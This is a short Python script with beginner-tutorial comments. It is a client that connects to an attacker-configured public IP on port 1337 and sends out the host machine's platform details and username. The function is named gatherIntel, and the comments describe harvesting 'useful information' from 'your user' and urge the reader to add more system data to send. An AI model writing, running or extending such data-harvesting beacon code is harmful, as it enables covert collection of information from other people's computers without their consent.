import socket
import threading
import platform
import getpass

# this needs to be changed to your public ip address! simply google "what's my ip", and google will spit out your public ip address for you. 
# just replace the 127.0.0.1 address. That's for localhost only
# serverAddress = '50.67.234.237' <- like this
serverAddress = '127.0.0.1'
#  this port needs to be the same on both server and client. make sure the port is forwarded on your router, as well!
port = 1337

def startClient():
	# create the client socket, using AF_INET (IP address family) and SOCK_STREAM (TCP)
	clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	# connect to the server using the ip address and port from aboce
	clientSocket.connect((serverAddress, port))

	# this passes the connected socket in, and deals with sending the data
	gatherIntel(clientSocket)

	# close the socket once you're done
	clientSocket.close()

# this is where you could harvest some really useful information
# the server will already have the ip address, but that's not super useful
# so, in addition, let's send some useful info!
# if you'd like to get more info from the system, simply google the type of info, and add python to the end. 
# stackexchange is your friend, along with reddit, of course.
def gatherIntel(clientSocket):
	# this command returns a string containing the platform your user is on
	# for me, it returns Windows 8, along with some additional info
		# i'm wrapping that in the sendall function, which sends a string. 
		# that way, your client sends their platform to the server!
	clientSocket.sendall(platform.platform())

	# this one will get the username of the client (on windows and unix systems, at least)
		# in my case, it prints out Jake
	clientSocket.sendall(getpass.getuser())

	# if you want to add more data to the string to send, just get a string of data you'd like the server to have
		# then use sendall to send it!
		# clientSocket.sendall(<your data here>)


startClient()